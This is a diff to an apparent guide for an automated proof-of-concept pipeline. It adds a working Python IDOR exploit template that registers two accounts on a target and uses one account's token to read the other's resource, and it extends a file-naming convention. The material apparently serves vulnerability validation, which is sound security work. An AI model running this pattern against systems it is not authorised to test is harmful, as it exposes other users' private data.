@@ -282,9 +282,56 @@ def validate(result):
     return result is not None and result.get("marker") == MARKER
 ```
 
+### IDOR PoC Pattern
+
+```python
+# For IDOR: create two test accounts, authenticate as each, cross-access resources
+import time, requests
+
+def exploit(target, timeout):
+    ts = str(int(time.time()))
+    reg_ep   = f"{target}/api/register"   # adjust to actual endpoint
+    auth_ep  = f"{target}/api/login"      # adjust to actual endpoint
+    rsrc_ep  = f"{target}/api/users"      # adjust to actual resource endpoint
+
+    u1 = {"username": f"idor_a_{ts}", "password": "PocPassA1!", "email": f"a_{ts}@poc.test"}
+    u2 = {"username": f"idor_b_{ts}", "password": "PocPassB1!", "email": f"b_{ts}@poc.test"}
+
+    try:
+        # Register two users
+        r1 = requests.post(reg_ep, json=u1, timeout=timeout)
+        r2 = requests.post(reg_ep, json=u2, timeout=timeout)
+        if r1.status_code not in (200, 201) or r2.status_code not in (200, 201):
+            return None
+
+        # Login both users
+        l1 = requests.post(auth_ep, json={"username": u1["username"], "password": u1["password"]}, timeout=timeout).json()
+        l2 = requests.post(auth_ep, json={"username": u2["username"], "password": u2["password"]}, timeout=timeout).json()
+
+        token1 = l1.get("token") or l1.get("access_token") or l1.get("jwt", "")
+        user2_id = l2.get("user_id") or l2.get("id", "")
+
+        if not token1 or not user2_id:
+            return None
+
+        # IDOR test: use user1's token to access user2's resource
+        resp = requests.get(f"{rsrc_ep}/{user2_id}",
+                            headers={"Authorization": f"Bearer {token1}"},
+                            timeout=timeout)
+        if resp.status_code == 200 and u2["username"] in resp.text:
+            return {"user1": u1["username"], "user2_id": user2_id,
+                    "http_code": resp.status_code, "evidence": resp.text[:300]}
+    except Exception:
+        pass
+    return None
+
+def validate(result):
+    return result is not None and result.get("http_code") == 200
+```
+
 ## Naming Convention (MANDATORY)
 
-**Format**: `poc_<type>_<NNN>.py` — where `<type>` is one of the 6 supported vuln types and `<NNN>` is a 3-digit zero-padded sequential number.
+**Format**: `poc_<type>_<NNN>.py` — where `<type>` is one of the 9 supported vuln types and `<NNN>` is a 3-digit zero-padded sequential number.
 
 **Valid examples**:
 ```
@@ -296,6 +343,7 @@ poc_arbitrary_file_rw_005.py
 poc_dos_006.py
 poc_sql_injection_007.py
 poc_xss_008.py
+poc_idor_009.py
 ```
 
 **ANTI-PATTERNS (FORBIDDEN — observed in actual pipeline runs)**:
